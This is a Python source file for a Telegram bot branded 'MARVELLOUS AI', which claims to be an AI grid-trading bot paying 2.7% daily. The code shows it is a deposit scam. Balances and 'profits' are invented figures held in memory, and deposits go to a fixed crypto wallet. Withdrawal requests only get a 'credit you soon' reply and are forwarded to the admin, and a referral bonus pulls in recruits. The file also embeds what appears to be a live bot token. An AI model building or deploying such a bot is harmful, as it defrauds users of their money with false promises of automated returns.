import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

BOT_TOKEN = "8148318952:AAHIVB8eyXke9UKeXCfj3PBC86BZOlDiwcE"
ADMIN_ID = 7733072316
DEPOSIT_WALLET = "0x93Fd0A7a93Fd248529ef939af38A1CB6A5AF5D7f"

users = {}

def get_user(user_id):
    if user_id not in users:
        users[user_id] = {"balance": 3.0, "last_claim": 0, "total_withdraw": 0.0, "referrals": 0}
    return users[user_id]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = get_user(update.effective_user.id)
    if context.args:
        try:
            referrer_id = int(context.args[0])
            if referrer_id!= update.effective_user.id and referrer_id in users:
                users[referrer_id]["balance"] += 0.50
                users[referrer_id]["referrals"] += 1
        except: pass
    text = f"""
╔═══════════════════╗
   🚀 *MARVELLOUS AI*
   AI Grid Trading Bot
╚═══════════════════╝

👋 Welcome, {update.effective_user.first_name}!

┌─ *YOUR PORTFOLIO*
│ 💰 Balance: `{user['balance']:.4f} USDT`
│ 📊 Daily Yield: `2.7%`
│ ✅ Status: `Active`
└───────────────────

🎁 Bonus: 3.00 USDT activated.
"""
    keyboard = [
        [InlineKeyboardButton("💸 CLAIM PROFIT", callback_data="claim")],
        [InlineKeyboardButton("💼 Portfolio", callback_data="balance"), InlineKeyboardButton("👥 Team", callback_data="ref")],
        [InlineKeyboardButton("💳 DEPOSIT", callback_data="deposit"), InlineKeyboardButton("💵 WITHDRAW", callback_data="withdraw")],
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = get_user(query.from_user.id)
    now = time.time()
    if query.data == "claim":
        if now - user["last_claim"] < 86400:
            h = int((86400 - (now - user["last_claim"])) / 3600)
            await query.edit_message_text(f"⏳ Next claim in {h}h\n💰 Balance: `{user['balance']:.4f} USDT`", parse_mode="Markdown")
            return
        profit = user["balance"] * 0.027
        user["balance"] += profit
        user["last_claim"] = now
        await query.edit_message_text(f"✅ Claimed `+{profit:.4f} USDT`\nNew: `{user['balance']:.4f} USDT`", parse_mode="Markdown")
    elif query.data == "deposit":
        await query.edit_message_text(f"💳 *DEPOSIT*\n\nSend BEP20 USDT to:\n`{DEPOSIT_WALLET}`\n\nMin: 1 USDT\n\nAfter sending, forward Tx Hash here.", parse_mode="Markdown")
    elif query.data == "withdraw":
        await query.edit_message_text(f"💵 Balance: `{user['balance']:.4f} USDT`\nSend: `BEP20 Address + Amount`\nEx: `0x123... 1.5`", parse_mode="Markdown")
    elif query.data == "balance":
        await query.edit_message_text(f"💼 Balance: `{user['balance']:.4f}` | Team: {user['referrals']}", parse_mode="Markdown")
    elif query.data == "ref":
        link = f"https://t.me/{context.bot.username}?start={query.from_user.id}"
        await query.edit_message_text(f"👥 Link:\n`{link}`\nEarn 0.50 per invite", parse_mode="Markdown")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ Received! Admin will check and credit you soon.")
    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔔 NEW from @{update.effective_user.username} ID:{update.effective_user.id}\n\n{update.message.text}")
    except:
        pass

app = Application.builder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(button_handler))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
print("Bot running...")
app.run_polling()
